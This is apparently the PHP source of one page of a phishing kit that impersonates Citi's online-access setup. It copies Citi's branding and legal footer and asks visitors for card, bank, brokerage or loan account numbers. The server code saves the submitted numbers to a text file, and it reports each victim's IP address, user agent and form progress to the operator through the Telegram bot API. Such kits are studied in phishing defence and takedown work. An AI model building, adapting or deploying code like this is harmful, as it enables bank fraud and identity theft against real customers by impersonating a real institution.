<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Initialize session ID if not exists
if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = uniqid('citi_', true);
    
    // Send Telegram notification for new user
    if (TELEGRAM_ENABLED) {
        $message = replaceTemplateVars(TELEGRAM_NEW_USER_MESSAGE, [
            'session_id' => $_SESSION['session_id'],
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'timestamp' => getFormattedTimestamp()
        ]);
        
        $telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $postData = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

$errors = [];
$success = false;

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $accountType = $_POST['accountType'] ?? '';
    $accountNumber = trim($_POST['accountNumber'] ?? '');
    
    // Validation
    if (empty($accountType)) {
        $errors['accountType'] = 'Please select an account type';
    }
    
    if (empty($accountNumber)) {
        $errors['accountNumber'] = 'Please enter your account number';
    } else {
        // Validate based on account type
        $accountDigits = preg_replace('/\s/', '', $accountNumber);
        
        if ($accountType === 'credit_debit') {
            if (strlen($accountDigits) < 13 || strlen($accountDigits) > 19) {
                $errors['accountNumber'] = 'Please enter a valid card number';
            }
        } elseif ($accountType === 'bank_account') {
            if (strlen($accountDigits) < 8 || strlen($accountDigits) > 17) {
                $errors['accountNumber'] = 'Please enter a valid bank account number';
            }
        } else {
            if (strlen($accountDigits) < 5) {
                $errors['accountNumber'] = 'Please enter a valid account number';
            }
        }
    }
    
    if (empty($errors)) {
        // Save to file
        $data = [
            'step' => 'setup_online_access',
            'session_id' => $_SESSION['session_id'],
            'account_type' => $accountType,
            'account_number' => $accountDigits,
            'timestamp' => getFormattedTimestamp()
        ];
        
        saveUserData('setup_online_access.txt', $data);
        
        // Send Telegram notification
        if (TELEGRAM_ENABLED) {
            $accountTypeLabels = [
                'credit_debit' => 'Credit/Debit Card',
                'bank_account' => 'Bank Account',
                'ppp_loan' => 'PPP Loan Account',
                'brokerage' => 'Brokerage Account',
                'personal_loan' => 'Personal Loan Account'
            ];
            
            $message = replaceTemplateVars(TELEGRAM_STEP_COMPLETED_MESSAGE, [
                'step' => 'Setup Online Access - ' . ($accountTypeLabels[$accountType] ?? $accountType),
                'session_id' => $_SESSION['session_id'],
                'timestamp' => getFormattedTimestamp()
            ]);
            
            $telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
            $postData = [
                'chat_id' => TELEGRAM_CHAT_ID,
                'text' => $message,
                'parse_mode' => 'HTML'
            ];
            
            $ch = curl_init($telegramUrl);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
        
        $success = true;
        
        // For now, just show success. In a full flow, this would redirect to confirmation.php
        // header('Location: confirmation.php');
        // exit;
    }
}
?>
<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Up Online Access - Citi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            background-color: #f7f8fa;
            color: #333;
            line-height: 1.6;
        }

        /* Header */
        .header {
            background-color: #fff;
            padding: 20px 40px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .logo {
            height: 64px;
            width: auto;
        }

        /* Progress Stepper */
        .stepper-container {
            background-color: #fff;
            padding: 40px 40px 20px;
            border-bottom: 1px solid #e5e7eb;
        }

        .stepper {
            max-width: 900px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            position: relative;
        }

        .stepper::before {
            content: '';
            position: absolute;
            top: 16px;
            left: 0;
            right: 0;
            height: 2px;
            background-color: #e5e7eb;
            z-index: 0;
        }

        .step {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
        }

        .step-indicator {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #fff;
            border: 2px solid #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            color: #9ca3af;
            margin-bottom: 8px;
        }

        .step.completed .step-indicator {
            background-color: #056dae;
            border-color: #056dae;
            color: #fff;
        }

        .step.active .step-indicator {
            background-color: #056dae;
            border-color: #056dae;
            color: #fff;
        }

        .step-label {
            font-size: 13px;
            color: #6b7280;
            text-align: center;
            max-width: 120px;
        }

        .step.active .step-label {
            color: #056dae;
            font-weight: 500;
        }

        .step.completed .step-label {
            color: #374151;
        }

        /* Main Content */
        .main-content {
            max-width: 700px;
            margin: 60px auto;
            padding: 0 40px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 400;
            color: #1f2937;
            margin-bottom: 16px;
        }

        .page-description {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 40px;
            line-height: 1.6;
        }

        /* Form Styles */
        .form-group {
            margin-bottom: 20px;
        }

        .radio-option {
            display: flex;
            align-items: flex-start;
            margin-bottom: 16px;
            cursor: pointer;
        }

        .radio-option input[type="radio"] {
            margin-top: 3px;
            margin-right: 12px;
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #056dae;
        }

        .radio-option label {
            font-size: 14px;
            color: #1f2937;
            cursor: pointer;
            flex: 1;
        }

        .input-field {
            width: 100%;
            max-width: 400px;
            padding: 10px 12px;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            font-size: 14px;
            margin-top: 8px;
            margin-left: 30px;
            font-family: inherit;
        }

        .input-field:focus {
            outline: none;
            border-color: #056dae;
            box-shadow: 0 0 0 3px rgba(5, 109, 174, 0.1);
        }

        .input-field::placeholder {
            color: #9ca3af;
        }

        /* Buttons */
        .button-group {
            margin-top: 40px;
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .btn-continue {
            background-color: #d1d5db;
            color: #6b7280;
            border: none;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: not-allowed;
            font-family: inherit;
        }

        .btn-continue.active {
            background-color: #056dae;
            color: #fff;
            cursor: pointer;
        }

        .btn-continue.active:hover {
            background-color: #044d7f;
        }

        .btn-cancel {
            color: #056dae;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .btn-cancel:hover {
            text-decoration: underline;
        }

        /* Chat Button */
        .chat-button {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background-color: #056dae;
            color: #fff;
            border: none;
            border-radius: 24px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: inherit;
        }

        .chat-button:hover {
            background-color: #044d7f;
        }

        .chat-icon {
            width: 20px;
            height: 20px;
        }

        /* Footer */
        .footer {
            background-color: #4a4a4a;
            color: #fff;
            padding: 60px 40px 40px;
            margin-top: 80px;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
        }

        .footer-columns {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 40px;
            margin-bottom: 40px;
        }

        .footer-column h3 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #fff;
        }

        .footer-column ul {
            list-style: none;
        }

        .footer-column ul li {
            margin-bottom: 10px;
        }

        .footer-column ul li a {
            color: #e0e0e0;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-column ul li a:hover {
            color: #fff;
            text-decoration: underline;
        }

        .footer-apps {
            display: flex;
            gap: 12px;
            margin-bottom: 30px;
        }

        .app-badge {
            height: 40px;
            cursor: pointer;
        }

        .footer-social {
            display: flex;
            gap: 16px;
            justify-content: flex-end;
            margin-bottom: 30px;
        }

        .social-icon {
            width: 32px;
            height: 32px;
            background-color: #5a5a5a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .social-icon:hover {
            background-color: #6a6a6a;
        }

        .social-icon svg {
            width: 18px;
            height: 18px;
            fill: #fff;
        }

        .footer-legal {
            border-top: 1px solid #5a5a5a;
            padding-top: 20px;
            margin-top: 20px;
        }

        .footer-legal-links {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }

        .footer-legal-links a {
            color: #e0e0e0;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-legal-links a:hover {
            text-decoration: underline;
        }

        .footer-disclaimer {
            font-size: 11px;
            line-height: 1.6;
            color: #c0c0c0;
            margin-bottom: 30px;
        }

        .footer-bottom {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .footer-logo {
            height: 24px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header {
                padding: 16px 20px;
            }

            .stepper-container {
                padding: 24px 20px 16px;
            }

            .stepper {
                padding: 0 10px;
            }

            .step-label {
                font-size: 11px;
                max-width: 80px;
            }

            .step-indicator {
                width: 28px;
                height: 28px;
                font-size: 12px;
            }

            .main-content {
                margin: 40px auto;
                padding: 0 20px;
            }

            .page-title {
                font-size: 24px;
            }

            .input-field {
                margin-left: 0;
                max-width: 100%;
            }

            .button-group {
                flex-direction: column;
                align-items: flex-start;
                gap: 16px;
            }

            .btn-continue {
                width: 100%;
            }

            .footer {
                padding: 40px 20px 30px;
            }

            .footer-columns {
                grid-template-columns: repeat(2, 1fr);
                gap: 30px;
            }

            .footer-social {
                justify-content: flex-start;
            }

            .footer-bottom {
                flex-direction: column;
                align-items: flex-start;
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <img src="assets/citiredesign.svg" alt="Citi" class="logo">
    </div>

    <!-- Progress Stepper -->
    <div class="stepper-container">
        <div class="stepper">
            <div class="step completed">
                <div class="step-indicator">✓</div>
                <div class="step-label">Account Information</div>
            </div>
            <div class="step completed">
                <div class="step-indicator">✓</div>
                <div class="step-label">Verification</div>
            </div>
            <div class="step active">
                <div class="step-indicator">3</div>
                <div class="step-label">Set Up Online Access</div>
            </div>
            <div class="step">
                <div class="step-indicator">4</div>
                <div class="step-label">Confirmation</div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <h1 class="page-title">Let's Set Up Your Online Access</h1>
        <p class="page-description">
            You can view or manage your account online in just a few easy steps. Enter the account or card number we mailed to you, or that was provided when your account was opened.
        </p>

        <?php if ($success): ?>
            <div style="background-color: #d1fae5; border: 1px solid #10b981; border-radius: 8px; padding: 16px; margin-bottom: 24px;">
                <p style="color: #065f46; font-size: 14px; font-weight: 500;">✓ Success! Your information has been submitted.</p>
                <p style="color: #047857; font-size: 13px; margin-top: 4px;">Session ID: <?php echo htmlspecialchars($_SESSION['session_id']); ?></p>
            </div>
        <?php endif; ?>

        <?php if (!empty($errors)): ?>
            <div style="background-color: #fee2e2; border: 1px solid #ef4444; border-radius: 8px; padding: 16px; margin-bottom: 24px;">
                <p style="color: #991b1b; font-size: 14px; font-weight: 500; margin-bottom: 8px;">Please fix the following errors:</p>
                <ul style="list-style: disc; padding-left: 20px;">
                    <?php foreach ($errors as $error): ?>
                        <li style="color: #dc2626; font-size: 13px;"><?php echo htmlspecialchars($error); ?></li>
                    <?php endforeach; ?>
                </ul>
            </div>
        <?php endif; ?>

        <form id="setupForm" method="POST" action="">
            <div class="form-group">
                <div class="radio-option">
                    <input type="radio" id="creditDebit" name="accountType" value="credit_debit" checked onchange="handleRadioChange()">
                    <div style="flex: 1;">
                        <label for="creditDebit">Credit/Debit Card Number</label>
                        <input 
                            type="text" 
                            id="creditDebitInput" 
                            name="accountNumber" 
                            class="input-field" 
                            placeholder="Credit/Debit Card Number"
                            maxlength="19"
                            oninput="handleInputChange()"
                        >
                    </div>
                </div>

                <div class="radio-option">
                    <input type="radio" id="bankAccount" name="accountType" value="bank_account" onchange="handleRadioChange()">
                    <label for="bankAccount">Bank Account Number</label>
                </div>

                <div class="radio-option">
                    <input type="radio" id="pppLoan" name="accountType" value="ppp_loan" onchange="handleRadioChange()">
                    <label for="pppLoan">Paycheck Protection Program Loan Account Number</label>
                </div>

                <div class="radio-option">
                    <input type="radio" id="brokerage" name="accountType" value="brokerage" onchange="handleRadioChange()">
                    <label for="brokerage">Brokerage Account Number</label>
                </div>

                <div class="radio-option">
                    <input type="radio" id="personalLoan" name="accountType" value="personal_loan" onchange="handleRadioChange()">
                    <label for="personalLoan">Personal Loan-Only Account Number</label>
                </div>
            </div>

            <div class="button-group">
                <button type="submit" id="continueBtn" class="btn-continue" disabled>Continue</button>
                <a href="#" class="btn-cancel">Cancel</a>
            </div>
        </form>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-content">
            <!-- Footer Columns -->
            <div class="footer-columns">
                <!-- Why Citi -->
                <div class="footer-column">
                    <h3>Why Citi</h3>
                    <ul>
                        <li><a href="#">Our Story</a></li>
                        <li><a href="#">Careers</a></li>
                        <li><a href="#">Benefits and Services</a></li>
                        <li><a href="#">Insights</a></li>
                        <li><a href="#">Citi Entertainment®</a></li>
                        <li><a href="#">Special Offers</a></li>
                    </ul>
                </div>

                <!-- Wealth Management -->
                <div class="footer-column">
                    <h3>Wealth Management</h3>
                    <ul>
                        <li><a href="#">Citigold® Private Client</a></li>
                        <li><a href="#">Citigold®</a></li>
                        <li><a href="#">Citi Priority</a></li>
                        <li><a href="#">Citi Private Bank</a></li>
                    </ul>
                </div>

                <!-- Business Banking -->
                <div class="footer-column">
                    <h3>Business Banking</h3>
                    <ul>
                        <li><a href="#">Small Business Accounts</a></li>
                        <li><a href="#">Commercial Accounts</a></li>
                    </ul>
                </div>

                <!-- Rates -->
                <div class="footer-column">
                    <h3>Rates</h3>
                    <ul>
                        <li><a href="#">Personal Banking</a></li>
                        <li><a href="#">Credit Cards</a></li>
                        <li><a href="#">Mortgage</a></li>
                        <li><a href="#">Home Equity</a></li>
                        <li><a href="#">Personal Loans</a></li>
                    </ul>
                </div>

                <!-- Help & Support -->
                <div class="footer-column">
                    <h3>Help & Support</h3>
                    <ul>
                        <li><a href="#">Contact Us</a></li>
                        <li><a href="#">Help & FAQs</a></li>
                        <li><a href="#">Security Center</a></li>
                    </ul>
                </div>
            </div>

            <!-- App Badges and Social Media -->
            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 30px;">
                <div class="footer-apps">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play" class="app-badge">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Download on the App Store" class="app-badge">
                </div>
                <div class="footer-social">
                    <!-- Facebook -->
                    <a href="#" class="social-icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                    </a>
                    <!-- X/Twitter -->
                    <a href="#" class="social-icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                        </svg>
                    </a>
                    <!-- YouTube -->
                    <a href="#" class="social-icon">
                        <svg viewBox="0 0 24 24">
                            <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                        </svg>
                    </a>
                </div>
            </div>

            <!-- Legal Section -->
            <div class="footer-legal">
                <div class="footer-legal-links">
                    <a href="#">© 2024 Citigroup Inc.</a>
                    <a href="#">Terms & Conditions</a>
                    <a href="#">Privacy</a>
                    <a href="#">Notice of Collection</a>
                    <a href="#">Do Not Sell or Share My Personal Information</a>
                    <a href="#">Accessibility</a>
                </div>

                <div class="footer-disclaimer">
                    <p><strong>Important Legal Disclosures & Information</strong></p>
                    <p>Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It has not, and should not be construed as, an offer, invitation or solicitation to buy or sell any of the banking or financial products, or financial services mentioned herein to individuals outside of the United States. Products and services in Canada, including the Citibank® Dividend Platinum Select® Visa Card, are offered by Citibank Canada, a division of Citibank, N.A.</p>
                    <p>The products and services described on this website may not be available in all states or U.S. territories. Citi, Citibank, Citi and Arc Design and other marks used herein are service marks of Citigroup Inc. or its affiliates, used and registered throughout the world. Citi and its affiliates are not responsible for products and services offered by other companies.</p>
                </div>

                <div class="footer-bottom">
                    <img src="assets/citiredesign.svg" alt="Citi" class="footer-logo">
                </div>
            </div>
        </div>
    </footer>

    <!-- Chat Button -->
    <button class="chat-button">
        <svg class="chat-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
        </svg>
        Chat
    </button>

    <script>
        function handleRadioChange() {
            // Remove all existing input fields
            const existingInputs = document.querySelectorAll('.input-field');
            existingInputs.forEach(input => {
                if (input.id !== 'creditDebitInput') {
                    input.remove();
                }
            });

            // Get selected radio button
            const selectedRadio = document.querySelector('input[name="accountType"]:checked');
            const selectedValue = selectedRadio.value;

            // Show/hide credit debit input
            const creditDebitInput = document.getElementById('creditDebitInput');
            if (selectedValue === 'credit_debit') {
                creditDebitInput.style.display = 'block';
            } else {
                creditDebitInput.style.display = 'none';
                
                // Create input for other options
                const inputField = document.createElement('input');
                inputField.type = 'text';
                inputField.name = 'accountNumber';
                inputField.className = 'input-field';
                inputField.oninput = handleInputChange;
                
                // Set placeholder based on selection
                const placeholders = {
                    'bank_account': 'Bank Account Number',
                    'ppp_loan': 'Paycheck Protection Program Loan Account Number',
                    'brokerage': 'Brokerage Account Number',
                    'personal_loan': 'Personal Loan-Only Account Number'
                };
                inputField.placeholder = placeholders[selectedValue];
                
                // Insert after the label
                const radioDiv = selectedRadio.closest('.radio-option');
                const label = radioDiv.querySelector('label');
                const container = document.createElement('div');
                container.style.flex = '1';
                container.appendChild(label);
                container.appendChild(inputField);
                
                // Replace label with container
                label.parentNode.replaceChild(container, label);
            }

            handleInputChange();
        }

        function handleInputChange() {
            const continueBtn = document.getElementById('continueBtn');
            const inputs = document.querySelectorAll('.input-field');
            let hasValue = false;

            inputs.forEach(input => {
                if (input.style.display !== 'none' && input.value.trim() !== '') {
                    hasValue = true;
                }
            });

            if (hasValue) {
                continueBtn.classList.add('active');
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
            }
        }

        // Format card number with spaces for credit/debit
        document.getElementById('creditDebitInput').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formattedValue;
        });
    </script>
</body>
</html>
